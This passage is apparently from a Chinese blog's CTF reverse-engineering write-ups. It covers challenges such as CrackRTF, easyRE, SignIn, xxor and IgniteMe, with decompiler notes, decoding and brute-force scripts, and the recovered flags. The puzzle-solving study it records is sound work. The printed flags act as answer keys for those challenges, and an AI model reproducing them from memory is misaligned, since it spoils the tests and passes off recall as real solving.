pub.key:\n\nUnciphered data :\nHEX : 0x00029d207b7a521e08e4e6180600666c61677b646563727970745f3235367d0a\nINT (big endian) : 4618144028027957675862906963888332345633248954043303780331531906089123082\nINT (little endian) : 4744358497414744401850218354568232353073084770228403473305939615805528146432\nutf-16 : Ȁ₝穻Ṓᣦ汦条摻捥祲瑰㉟㘵੽\nSTR : b'\\x00\\x02\\x9d {zR\\x1e\\x08\\xe4\\xe6\\x18\\x06\\x00flag{decrypt_256}\\n'\n```\n\n```\nflag{decrypt_256}\n```\n\n# 6. CrackRTF\n\n{% asset_img 6.1.png IDA分析 %}\n\n{% asset_img 6.2.png IDA分析 %}\n\n查看一下`CryptCreateHash`函数原型：\n\n```c\nBOOL CRYPTFUNC CryptCreateHash( \n  HCRYPTPROV hProv,\t\t//句柄\n  ALG_ID Algid, \t\t//算法id\n  HCRYPTKEY hKey, \t\t//必须为0\n  DWORD dwFlags, \t\t//标志值\n  HCRYPTHASH* phHash\t//存储哈希值的地址\n);\n```\n\nAlgid在这里查：https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id ，发现0x8004是SHA1加密算法。\n\n{% asset_img 6.3.png SHA加密算法 %}\n\n此时可以通过Python的hashlib包对前6位进行爆破。\n\n```python\nimport hashlib\nflag2 = \"@DBApp\"\n# 字符串转换为整型大于100000，长度为6，所以最大为999999\n# atoi只有字符串全为数字才能转换\nfor i in range(100000,999999):\n    h2 = hashlib.sha1((str(i)+flag2).encode())\n    flags = h2.hexdigest()\n    # hashlib解密后是小写，所以要转换为小写\n    if \"6E32D0943418C2C33385BC35A1470250DD8923A9\".lower() == flags:\n            print (str(i)+flag2)\n'''\n123321@DBApp\n'''\n```\n\n所以前6位为`123321`。继续分析密码2。\n\n{% asset_img 6.4.png IDA分析 %}\n\n进入401019，又是加密函数，0x8003是MD5加密。但这时不能用上面方法解决了，因为它的范围太大了，不只是数字组合还有字母组合还有数字字母组合，所以爆破这方法不可行。\n\n我们看到还调用了一个40100F的函数，可以进去看看。\n\n{% asset_img 6.5.png IDA分析 %}\n\n{% asset_img 6.6.png IDA分析 %}\n\n既然需要知道资源数据，我们在[吾爱破解培训第三课](https://v5le0n9.github.io/posts/7cd35487.html?#4-%E4%BF%AE%E6%94%B9%E7%89%88%E6%9D%83%E5%92%8C%E8%B5%84%E6%BA%90)里就用过很多查看或修改资源的工具，比如：Restorator、ResEdit、ResourceHacker等。\n\n我们用ResourceHacker打开exe文件，找到AAA类型的资源数据。\n\n{% asset_img 6.7.png 资源数据 %}\n\n整个字符串一共18位，但后12位我们已经知道了，所以只要异或前6位即可。资源数据前6位为`05 7D 41 15 26 01`。而rtf文件的前6位是什么呢？我们已经知道CreateFileA新建一个0字节的文件，也就是说rtf的文件头也是我们写入的，而头文件是文件最开始的数据，所以我们需要rtf文件头的前6位。\n\n创建一个`.rtf`文件，在里面写点东西。拖进WinHex查看文件头。(不写直接拖进WinHex为空，任何文件任何格式创建了不写都是如此)\n\n{% asset_img 6.8.png rtf文件格式 %}\n\n那么现在可以编写逆向脚本了：\n\n```python\nrtf = [0x7b,0x5c,0x72,0x74,0x66,0x31]\nres = [0x05,0x7d,0x41,0x15,0x26,0x01]\nans = \"\"\nfor i in range(len(rtf)):\n    ans += chr(rtf[i] ^ res[i])\nprint(ans)\n'''\n~!3a@0\n'''\n```\n\n所以这6位应该为`~!3a@0`。运行程序，依次输入密码1和密码2，会在当前目录生成一个dbapp.rtf文件，打开就是flag。\n\n```\nFlag{N0_M0re_Free_Bugs}\nflag{N0_M0re_Free_Bugs}\n```\n\n# 7. login\n\n这道题应该算是Web逆向吧？\n\n{% asset_img 7.1.png js分析 %}\n\n```python\nif c <= 'Z':\n    tmp = 90\nelse:\n    tmp = 122\nc2 = ord(c) + 13\nif tmp >= c2:\n    result = c2\nelse:\n    result = c2 - 26\n```\n\n不知不觉，get到遍历可打印字符的香了。\n\n```python\nimport string\nflag = list(\"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz\")\nans = flag\ninput = string.printable\nfor i in range(len(flag)):\n    for j in input:\n        if (j <= 'Z' and j >= 'A') or (j <= 'z' and j >= 'a'):\n            if j <= 'Z':\n                tmp = 90\n            else:\n                tmp = 122\n            j2 = ord(j) + 13\n            if tmp >= j2:\n                result = j2\n            else:\n                result = j2 - 26\n            if chr(result) == flag[i]:\n                ans[i] = j\n                break\nfor i in range(len(ans)):\n    print(ans[i],end=\"\")\nprint()\n'''\nClientSideLoginsAreEasy@flare-on.com\n'''\n```\n\n```\nflag{ClientSideLoginsAreEasy@flare-on.com}\n```\n\n# 8. easyRE\n\n下载下来是ELF文件，直接载入IDA看看吧。\n\n太多函数的话直接找字符串，大家都会了吧？不会寄几拣生，懒得写了。\n\n{% asset_img 8.1.png IDA分析 %}\n\n{% asset_img 8.2.png IDA分析 %}\n\n我们算出v18后再加上3个0字符也进行base64算法10次试试，发现与`off_6CC090`内存中的数据不一样！！\n\n```python\nimport base64\nflag = list(\"Iodl>Qnb(ocy\")\nflag.append(127)\nflag.extend(\"y.i\")\nflag.append(127)\nflag.extend(\"d`3w}wek9{iy=~yL@EC\")\nv18 = flag\nfor i in range(len(flag)):\n    if isinstance(flag[i],int):\n        v18[i] = chr(flag[i] ^ i)\n    else:\n        v18[i] = chr(ord(flag[i]) ^ i)\n    print(v18[i],end=\"\")\nprint()\nv18.append('0')\nv18.append('0')\nv18.append('0')\nstr=''.join(v18)\nprint(str)\nbs = base64.b64encode(str.encode(\"utf-8\"))\nfor i in range(9):\n    bs = base64.b64encode(bs)\nprint(bs)\n'''\nInfo:The first four chars are `flag`\nInfo:The first four chars are `flag`000\nb'Vm0wd2QyVkZOVWRXV0doVVYwZDRWRmx0ZEhkVU1WcDBUVmM1VjFadGVIbFhhMk0xVmpGYWRHVkdiR0ZXVjJoeVdWZDRZV014WkhGUmJVWlhWakZLU1ZkV1dsWmxSbGw0V2toV2FGSnNjSEJXTUdSdlpWWmtWMWR0ZEZSTlZUVklWbTAxUjFWdFNrZFhiR2hhWWtkU2RsWldXbXRYUjFKSVVteG9hVlpyV1hwV1JscGhWakZrU0ZOcmFGWmlSMmhoV1d0YWQxUkdjRmRYYkhCc1VtMVNNRnBGV2xOVWJGcDFVV3h3VjFZemFIWmFSRXBIVWpGT2RWWnNTbWhsYlhob1YxZDBhMkl5VW5OV2JrNVlZbGhTV0ZSV1pEQk9iR3hXVjJzNVZXSkdjRlpXYlhSelZqRmFSbUV6YUZkaGEzQklWbXBHVDFkWFRrZFRiV3hvWld4YVdsWXhaREJaVm14V1RVaG9hbEpYYUhOVmFrNVRWMFphZEdONlJsaGlSM2hYVmpJeE1HRkdXbkppZWtwYVYwaENSRll3V2xwbGJGWnpZVVp3YUdFeGNIbFdWRUpoVkRKU1YxUnVTbEJXYlZKUFZXMDFRMWRzV1hoWGJYUk9VakZHTkZZeWRHdGhWazVIVTI1T1ZtSllUWGhXTUZwelkyeGtkRkp0ZUZkaVJsa3hWa1phVTFFeVJrWk5XRTVZWW0xb1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ=='\n'''\n```\n\n好吧思路错了，v21与v18根本没关系，那我们将内存中的数据解码10次看看是什么。\n\n```python\nimport base64\nbs = 'Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ=='\nfor i in range(10):\n    bs = str(base64.b64decode(bs), \"utf-8\")\nprint(bs)\n'''\nhttps://bbs.pediy.com/thread-254172.htm\n'''\n```\n\n竟然是一个网址。写主动防御。听君一席话，胜读十年书。所以怎么找呢？这么多函数坑死我了。找有运算操作的，最后在`4009C6`下面一个函数`400D35`找到了有`f`和`g`字样的东西，进行某些运算。\n\n{% asset_img 8.3.png IDA分析 %}\n\n```python\nv1 = list(\"flag\")\nb6cc = [0x40,0x35,0x20,0x56,0x5d,0x18,0x22,0x45,0x17,0x2f,0x24,0x6e,0x62,0x3c,0x27,0x54,0x48,0x6c,0x24,0x6e,0x72,0x3c,0x32,0x45,0x5b]\nans = \"\"\nfor i in range(4):\n    v1[i] = ord(v1[i]) ^ b6cc[i]\nfor i in range(len(b6cc)):\n    ans += chr(b6cc[i] ^ v1[i%4])\nprint(ans)\n'''\nflag{Act1ve_Defen5e_Test}\n'''\n```\n\n# 9. [GUET-CTF2019]re\n\nELF文件，有UPX壳。ELF脱UPX壳在Linux下执行脱壳命令与Windows一致。\n\n```\nv5le0n9@ubuntu:~/Desktop$ upx -d re\n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2013\nUPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013\n\n        File size         Ratio      Format      Name\n   --------------------   ------   -----------   -----------\n    841042 <-    304524   36.21%  linux/ElfAMD   re\n\nUnpacked 1 file.\n```\n\n```python\nans = \"\"\nans += chr(166163712//1629056)\nans += chr(731332800//6771600)\nans += chr(357245568//3682944)\nans += chr(1074393000//10431000)\nans += chr(489211344//3977328)\nans += chr(518971936//5138336)\nans += \" \"\nans += chr(406741500//7532250)\nans += chr(294236496//5551632)\nans += chr(177305856//3409728)\nans += chr(650683500//13013670)\nans += chr(298351053//6088797)\nans += chr(386348487//7884663)\nans += chr(438258597//8944053)\nans += chr(249527520//5198490)\nans += chr(445362764//4544518)\nans += chr(981182160//10115280)\nans += chr(174988800//3645600)\nans += chr(493042704//9667504)\nans += chr(257493600//5364450)\nans += chr(767478780//13464540)\nans += chr(312840624//5488432)\nans += chr(1404511500//14479500)\nans += chr(316139670//6451830)\nans += chr(619005024//6252576)\nans += chr(372641472//7763364)\nans += chr(373693320//7327320)\nans += chr(498266640//8741520)\nans += chr(452465676//8871876)\nans += chr(208422720//4086720)\nans += chr(515592000//9374400)\nans += chr(719890500//5759124)\nprint(ans)\n'''\nflag{e 65421110ba03099a1c039337}\n'''\n```\n\n牛牛们说缺的那个是字符1，我在想难道是IDA优化问题导致的？还是说出题人就想我们爆破？\n\n```\nflag{e165421110ba03099a1c039337}\n```\n\n# 10. [SUCTF2019]SignIn\n\nELF文件，载入IDA。\n\n{% asset_img 10.1.png IDA分析 %}\n\n发现了什么姐妹们，有幂模运算，也有RSA标志性公钥65537，这还不是RSA加密算法？？[RSA算法描述与攻击方法](https://v5le0n9.github.io/posts/855b12c4.html)\n\n```\nn = v4 = 103461035900816914121390101299049044413950405173712170434161686539878160984549\ne = v5 = 65537\nc = v7 = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\n```\n\n将n拿去 http://factordb.com 分解一下，发现可以分解，得出p和q的值。\n\n```\np = 282164587459512124844245113950593348271\nq = 366669102002966856876605669837014229419\n```\n\n然后用RSA解密脚本直接得出私钥d，进而得到明文m。\n\n```python\nimport gmpy2\nn = 103461035900816914121390101299049044413950405173712170434161686539878160984549\np = 282164587459512124844245113950593348271\nq = 366669102002966856876605669837014229419\ne = 65537\n\nd = gmpy2.invert(e,(p-1)*(q-1))\nprint (\"d = \" + str(d))\n#d为私钥\nc = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\nm = gmpy2.powmod(c,d,n)\nprint(\"m = \" + str(m))\n'''\nd = 91646299298871237857836940212608056141193465208586711901499120163393577626813\nm = 185534734614696481020381637136165435809958101675798337848243069\n'''\n```\n\n下一步就是进入sub_96A函数查看算法。\n\n{% asset_img 10.2.png IDA分析 %}\n\n所以这个函数很有可能是字符串转换成十六进制，因为我们输入的就是字符串形式，返回值v9是以十六进制的形式存入v6的。将m转换为字符串：\n\n```python\nimport binascii\nm = 185534734614696481020381637136165435809958101675798337848243069\n# 先将它转化为16进制再去掉开头的0x，unhexlify与a2b_hex功能一致，作用是从16进制字符串中返回二进制数据，再用utf-8解码\nprint(binascii.unhexlify(hex(m)[2:]).decode(encoding=\"utf-8\"))\n'''\nsuctf{Pwn_@_hundred_years}\n'''\n```\n\n# 11. Transform\n\n{% asset_img 11.1.png IDA分析 %}\n\n{% asset_img 11.2.png IDA分析 %}\n\n```python\nflag = [0x67,0x79,0x7b,0x7f,0x75,0x2b,0x3c,0x52,0x53,0x79,0x57,0x5e,0x5d,0x42,0x7b,0x2d,0x2a,0x66,0x42,0x7e,0x4c,0x57,0x79,0x41,0x6b,0x7e,0x65,0x3c,0x5c,0x45,0x6f,0x62,0x4d]\nqiao = [9,0xa,0xf,0x17,7,0x18,0x0c,6,1,0x10,3,0x11,0x20,0x1d,0x0b,0x1e,0x1b,0x16,4,0x0d,0x13,0x14,0x15,2,0x19,5,0x1f,8,0x12,0x1a,0x1c,0x0e,0]\nans = [0 for x in range(0,33)]\t#定义列表长度并初始化为0\nst = [0 for x in range(0,33)]\nfor i in range(len(flag)):\n    ans[i] = flag[i] ^ qiao[i]\n    print(chr(ans[i]),end=\"\")\nprint()\nfor i in range(len(ans)):\n    # qiao的元素是st的下标，其实就是IDA那一行换过来赋值，我可能是困了在这里绕了好久！！\n    st[qiao[i]] = ans[i]\nfor i in range(len(st)):\n    print(chr(st[i]),end=\"\")\nprint()\n'''\nnsthr30TRiTO}_p31pFs_ClCr{z4N_slM\nMRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}\n'''\n```\n\n```\nflag{Tr4nsp0sltiON_Clph3r_1s_3z}\n```\n\n# 12. usualCrypt\n\n{% asset_img 12.1.png IDA分析 %}\n\n进去sub_401080看看。又有一个初始化函数，然后进行base64加密操作，最后的返回值也调用了一个函数。\n\n{% asset_img 12.2.png IDA分析 %}\n\n{% asset_img 12.3.png IDA分析 %}\n\n进去初始化函数，发现是将base64索引表的某些元素调换位置。\n\n{% asset_img 12.4.png IDA分析 %}\n\n进去返回值调用的函数。\n\n{% asset_img 12.5.png IDA分析 %}\n\n分析牛牛的脚本，我看懂了。\n\n```python\nimport base64\n# 大小写转换\nsecret = 'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'.swapcase() \na = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\ndict = {}\noffset = 10\nflag = ''\n\n# 初始化字典的键值对都是它本身\nfor i in range(len(a)):\n    dict[a[i]] = a[i]\n\n# 构造键不变，值变的字典\nfor i in range(6,15):  \n    b = dict[a[i]]\n    dict[a[i]] = dict[a[i+offset]]\n    dict[a[i+offset]] = b\n\n# 用secret的每个元素作为字典的键取字典的值，将secret转换为正常的base64加密字符串\nfor i in range(len(secret)):\n    flag += dict[secret[i]]\n\nflag = base64.b64decode(flag)\nprint(flag)\n'''\nflag{bAse64_h2s_a_Surprise}\n'''\n```\n\n# 13. Youngter-drive\n\n运行发现打不开，缺少msvcr100d.dll，从网上下载一个放在同目录下就好，现在可以打开了。有UPX壳，直接脱壳机脱掉。脱壳后程序又打不开了。\n\n不管，我们直接载入IDA分析代码。\n\n{% asset_img 13.1.png IDA分析 %}\n\n先看第一个线程。\n\n{% asset_img 13.2.png IDA分析 %}\n\n{% asset_img 13.4.png IDA分析 %}\n\n再看第二个。\n\n{% asset_img 13.3.png IDA分析 %}\n\n查看411190。\n\n{% asset_img 13.5.png IDA分析 %}\n\n整理下思路，可以确定输入字符串的长度为30，这两个线程是同步的，所以进行一次41112C函数要自减2，也就是输入的字符是间隔调用41112C的。但不知道哪个线程先执行，所以都要试一下。\n\n```python\nresult = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\"\nflag = ''\nf418 = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"\n\n# 下标为双数进行操作\nfor i in range(len(result)):\n    if i % 2 == 1:\n        flag += result[i]\n        continue\n    \n    # 如果是大写字母，一定是小写字母转换来的\n    if(result[i].isupper()):\n        flag += chr(f418.find(result[i]) + 96)\n    else:\n        flag += chr(f418.find(result[i]) + 38)\nprint (flag)\n'''\ndOGZGZDOCYJTHUAPXTHBKOJOJpKyk\n'''\n```\n\n```python\nresult = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\"\nflag = ''\nf418 = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"\n\n# 下标为单数进行操作\nfor i in range(len(result)):\n    if i % 2 == 0:\n        flag += result[i]\n        continue\n    if(result[i].isupper()):\n        flag += chr(f418.find(result[i]) + 96)\n    else:\n        flag += chr(f418.find(result[i]) + 38)\nprint (flag)\n'''\nThisisthreadofwindowshahaIsES\n'''\n```\n\n第二个flag是有意义的，所以应该是第二个。但长度为29，最后一位只能爆破，爆破出来是`E`。\n\n```\nflag{ThisisthreadofwindowshahaIsESE}\n```\n\n# 14. [HDCTF2019]Maze\n\n有UPX壳，脱壳后运行，正常。载入IDA，发现main函数部分不能反编译。那拿去OD爆破一下看看，发现我们输入的字符串就是flag。\n\n{% asset_img 14.1.png OD爆破 %}\n\n在OD查找关键字符串，发现有一个可有可无的跳转。(其实在IDA中main函数那里的jnz附近有标红，也可以知道这附近是有问题的)\n\n{% asset_img 14.2.png OD分析 %}\n\n将修改好的程序保存，载入IDA发现main函数可以反编译了。这里其实是用到了花指令，我们刚才所做的就是去除花指令。\n\n题目名字，迷宫，很熟悉啦，大家应该都玩过类似的题。玩过小游戏的就知道，wsad表示上下左右。\n\n{% asset_img 14.3.png IDA分析 %}\n\n但是迷宫地图在哪呢？去到字符串窗口发现，一串*号，但没有哪个函数调用它，我们只能猜测它的行数和列数。最后发现它7行10列时看起来比较像迷宫。\n\n```python\nflag = \"*******+********* ******    ****   ******* **F******    **************\"\nprint(len(flag))\nfor i in range(0,70,10):\n    ans = \"\"\n    for j in range(10):\n        ans += flag[i+j]\n    print(ans)\n'''\n70\n*******+**\n******* **\n****    **\n**   *****\n** **F****\n**    ****\n**********\n'''\n```\n\n按照+为起点，F为终点，可以得到`ssaaasaassdddw`。\n\n```\nflag{ssaaasaassdddw}\n```\n\n# 15. [MRCTF2020]Xor\n\n{% asset_img 15.1.png IDA分析 %}\n\n但我找了一下，IDA就没有401095啊？随便点进几个函数后发现又可以F5了，这里不知道是什么原因。\n\n{% asset_img 15.2.png IDA分析 %}\n\n如果实在不能F5，那就老老实实读汇编吧。\n\n{% asset_img 15.3.png IDA分析 %}\n\n剩下就很简单了，直接写脚本。这里只是想记录一下为什么会出现这个错？求解惑。\n\n```python\nflag = list('MSAWB~FXZ:J:`tQJ\"N@ bpdd}8g')\nans = ''\nfor i in range(len(flag)):\n    ans += chr(ord(flag[i]) ^ i)\nprint(ans)\n'''\nMRCTF{@_R3@1ly_E2_R3verse!}\n'''\n```\n\n```\nflag{@_R3@1ly_E2_R3verse!}\n```\n\n# 16. [GWCTF 2019]xxor\n\n{% asset_img 16.1.png IDA分析 %}\n\n{% asset_img 16.2.png IDA分析 %}\n\n{% asset_img 16.3.png IDA分析 %}\n\n```python\n# 求解三元一次方程组\nfrom sympy import *\nx,y,z = symbols('x,y,z')\nprint(solve([x-y-2225223423,y+z-4201428739,x-z-1121399208],[x,y,z]))\n'''\n{x: 3774025685, y: 1548802262, z: 2652626477}\n'''\n```\n\n那么现在v7数组中的所有元素都已知了。\n\n```\nv7[0] = 3746099070\t# 将负数转化为16进制再转为10进制变正数\nv7[1] = 550153460\nv7[2] = 3374025685\nv7[3] = 1548802262\nv7[4] = 2652626477\nv7[5] = 2230518816\n```\n\n回看sub_400686，将它的算法逆回来，循环中它是连加，那我们就连减。\n\n```python\na2 = [2,2,3,4]\na1 = [3746099070,550153460,3374025685,1548802262,2652626477,2230518816]\n\nfor j in range(0,5,2):\n    v3 = a1[j]\n    v4 = a1[j+1]\n    v5 = 1166789954 * 64\n    for i in range(64):\n        v4 -= (v3 + v5 + 20) ^ ((v3 << 6) + a2[2]) ^ ((v3 >> 9) + a2[3]) ^ 0x10\n        v3 -= (v4 + v5 + 11) ^ ((v4 << 6) + a2[0]) ^ ((v4 >> 9) + a2[1]) ^ 0x20\n        v5 -= 1166789954\n    a1[j] = v3\n    a1[j+1] = v4\n    \nfor i in range(6):\n    print(a1[i])\n    print()\n'''\n4094640321151510381430114527348791340818061486368325081105118858029441421392562115899927051354373143479918602379843527326422590896702063205097735983800064780954056157519958676446188144354842905191184000047384119685662681315026347071556102162\n\n-64846407269888040321797137717063369418274550862165842691382879936447707289304081311831415851335266644244860582121374108524030247661708208453235916273041741260734859775013491470888710031344340472282583536018181016610582990270536331206408833\n\n3626154157263275744924041982703855211085590162096727318779868232410757794884022528128551059600370555282067352751792979104390903963503421941488321742737873865096405783997624394295188802763521349460701601867796734712493771114831851042253589698\n\n-55775144830965060265952775552624430801605611614179956213691056963158136715255700275463473676424802814041829568498889655173123370495054229651227352476227137023578229841739490925121109830438369699146048932715237138347095053098321988593808508\n\n5587372600709315909307412143935466921910496550659392214787792118052869573959065029961759081338383226145709070679113041271660083414962147047524219462376386239236674131323547659492256250592476561092722517194615155328289506636964049781303051329\n\n-86739435205112991582038868144090858872150758616294322376667291065375318440446215889691830034827200180020765008148649882034652663397413325576631432190050276236816651479339637604954866146349956713033299076850370554519685898575638020305197992\n'''\n```\n\n救命这什么东西！！回看400686函数，发现v3和v4是无符号整型，但Python没有无符号整型。所以这个逆向算法最好用C写。\n\n```c\n#include <stdio.h>\nint main()\n{\n\tunsigned int a2[4] = { 2, 2, 3, 4 };\n\tunsigned int a1[6] = { 3746099070,550153460,3374025685,1548802262,2652626477,2230518816 };\n\tint i, j;\n\tunsigned int v3, v4;\n\tfor (j = 0; j <= 4; j += 2)\n\t{\n\t\tv3 = a1[j];\n\t\tv4 = a1[j + 1];\n\t\tint v5 = 1166789954 * 64;\n\t\tfor (i = 0;i < 64;i++)\n\t\t{\n\t\t\tv4 -= (v3 + v5 + 20) ^ ((v3 << 6) + a2[2]) ^ ((v3 >> 9) + a2[3]) ^ 0x10;\n\t\t\tv3 -= (v4 + v5 + 11) ^ ((v4 << 6) + a2[0]) ^ ((v4 >> 9) + a2[1]) ^ 0x20;\n\t\t\tv5 -= 1166789954;\n\t\t}\n\t\ta1[j] = v3;\n\t\ta1[j + 1] = v4;\n\n\t}\n\tfor (i = 0;i < 6;i++)\n\t\tprintf(\"%x\", a1[i]);\n}\n/**\n666c61677b72c2106b1c38d08e1772656174217d\n*/\n```\n\n```c\n#include <stdio.h>\nint main()\n{\n\tunsigned int xorm[6];\n\txorm[0] = 3746099070;\n\txorm[1] = 550153460;\n\txorm[2] = 3774025685;\n\txorm[3] = 1548802262;\n\txorm[4] = 2652626477;\n\txorm[5] = 2230518816;\n\tint i = 0, j = 0, sum;\n\tunsigned int temp[2] = { 0 };\n\tunsigned int data[4] = { 2,2,3,4 };\n\tfor (i = 0; i < 5; i += 2)\n\t{\n\t\ttemp[0] = xorm[i];\n\t\ttemp[1] = xorm[i + 1];\n\n\t\tsum = 0x458BCD42 * 64;\n\t\tfor (j = 0; j < 64; j++)\n\t\t{\n\t\t\ttemp[1] -= (temp[0] + sum + 20) ^ ((temp[0] << 6) + 3) ^ ((temp[0] >> 9) + 4) ^ 0x10;\n\t\t\ttemp[0] -= (temp[1] + sum + 11) ^ ((temp[1] << 6) + 2) ^ ((temp[1] >> 9) + 2) ^ 0x20;\n\t\t\tsum -= 0x458BCD42;\n\t\t}\n\t\txorm[i] = temp[0];\n\t\txorm[i + 1] = temp[1];\n\t}\n\tfor (i = 0; i < 6; i++)\n\t\tprintf(\"%x\", xorm[i]);\n}\n/**\n666c61677b72655f69735f6772656174217d\n*/\n```\n\n我真是日了狗了，上面的是我写的，下面有别人写的，究竟哪里不一样了？！为什么第二次结果就不同呢？！！！最后拿去在线16进制转文本的网站得到flag。\n\nPython我看到有位牛牛写出来了：\n\n```python\nfrom Crypto.Util.number import long_to_bytes\n\n# ctypes包调用C语言的数据类型\nfrom ctypes import *\nv6=[3746099070,550153460,3774025685,1548802262,2652626477,2230518816]\nunk=[2,2,3,4]\nfor i in range(0,5,2):\n    \n    # v5是int型，v3和v4是unsigned int型\n    v5 = c_int(1166789954*0x40)\n    v3 = c_uint(v6[i])\n    v4 = c_uint(v6[i+1])\n    for j in range(0x40):\n        \n        # 一定要加.value，因为它们类型不一样不能相加\n        v4.value -= ((v3.value+v5.value+20)^((v3.value<<6)+unk[2])^((v3.value>>9)+unk[3])^0x10)\n        v3.value -= ((v4.value+v5.value+11)^((v4.value<<6)+unk[0])^((v4.value>>9)+unk[1])^0x20)\n        v5.value -= 1166789954\n    v6[i] = v3.value\n    v6[i+1] = v4.value\n\nfor k in range(6):\n    # 进行long转byte的转换\n    print(long_to_bytes(v6[k]).decode(),end='')\nprint()\n'''\nflag{re_is_great!}\n'''\n```\n\n# 17. hello_world_go\n\n这题告诉我们一定要有耐心，尤其是我做完第16题在发疯的边缘完全是不能思考问题的。载入IDA，看到非常乱的代码，非常多函数，不要慌。找main函数，将main函数调用的内存先看了，如果特别的，再看main函数调用的函数。\n\n找呀找，最终找到这个内存数据，进去看看。\n\n{% asset_img 17.1.png IDA分析 %}\n\n{% asset_img 17.2.png IDA分析 %}\n\n发现就是flag。\n\n```\nflag{hello_world_gogogo}\n```\n\n# 18. level3\n\n载入IDA，查看源码。\n\n{% asset_img 18.1.png IDA分析 %}\n\n{% asset_img 18.2.png IDA分析 %}\n\n但发现它确实是变种的，一定是哪个函数给索引表的某些元素调换位置了。\n\n{% asset_img 18.3.png 运行程序 %}\n\n那在IDA找找，发现这个是个多么显眼的函数。\n\n{% asset_img 18.4.png IDA分析 %}\n\n按照它的算法将base64索引表替换。可利用第12题脚本进行解密。\n\n```python\nimport base64\nsecret = 'd2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD=='\na = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='\ndict = {}\noffset = 10\nflag = ''\n\n# 初始化字典的键值对都是它本身\nfor i in range(len(a)):\n    dict[a[i]] = a[i]\n\n# 构造键不变，值变的字典\nfor i in range(10):  \n    b = dict[a[i]]\n    dict[a[i]] = dict[a[19-i]]\n    dict[a[19-i]] = b\n\n# 用secret的每个元素作为字典的键取字典的值，将secret转换为正常的base64加密字符串\nfor i in range(len(secret)):\n    flag += dict[secret[i]]\n\nflag = base64.b64decode(flag).decode()\nprint(flag)\n'''\nwctf2020{Base64_is_the_start_of_reverse}\n'''\n```\n\n```\nflag{Base64_is_the_start_of_reverse}\n```\n\n# 19. IgniteMe\n\n无壳，载入IDA看看。\n\n{% asset_img 19.1.png IDA分析 %}\n\n那v4的初始值是多少呢？小凉第一次尝试IDA动态调试Windows程序啦！\n\nDebugger -> Select debugger -> Local Windows debugger，F9开启调试，在这里下断点，在程序里输入随意，回车，发现IDA停在断点处。此时，eax的值为4。\n\n{% asset_img 19.2.png 动态调试 %}\n\n{% asset_img 19.3.png 动态调试 %}\n\n也就是说v4的初始值为4。我太low了，思路理不清结果要画图才理得清。\n\n{% asset_img 19.4.png 思路图 %}\n\n那么现在可以把逆向脚本写出来了：\n\n```python\nb403 = [0x0d,0x26,0x49,0x45,0x2a,0x17,0x78,0x44,0x2b,0x6c,0x5d,0x5e,0x45,0x12,0x2f,0x17,0x2b,0x44,0x6f,0x6e,0x56,0x9,0x5f,0x45,0x47,0x73,0x26,0x0a,0x0d,0x13,0x17,0x48,0x42,0x1,0x40,0x4d,0x0c,0x2,0x69]\nv4 = 4\nfor i in range(len(b403)-1,0,-1):\n    if i == len(b403)-1:\n        b403[i] = b403[i] ^ v4\n    b403[i-1] = b403[i] ^ b403[i-1]\nfor i in range(len(b403)):\n    print(chr(b403[i]),end=\"\")\nprint()\n'''\nR_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com\n'''\n```\n\n```\nflag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com}\n```\n\n# 20. Overlong\n\n运行程序，只有一个提示框。载入IDA，查看只有几个函数。\n\n{% asset_img 20.1.png IDA分析 %}\n\n进入内存数据发现它从08开始一直到b7，一共AF个字节。我们载入OD，将它的长度从1C修改为AF。\n\n{% asset_img 20.2.png OD分析 %}\n\n但我们会发现修改后会覆盖下面的指令，所以我们要用到内嵌补丁。内嵌补丁的知识可以看[调试器使用教程 内嵌补丁部分](https://v5le0n9.github.io/posts/33a085c7.html#20-Inline-patch-%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81)。\n\n{% asset_img 20.3.png OD内嵌补丁 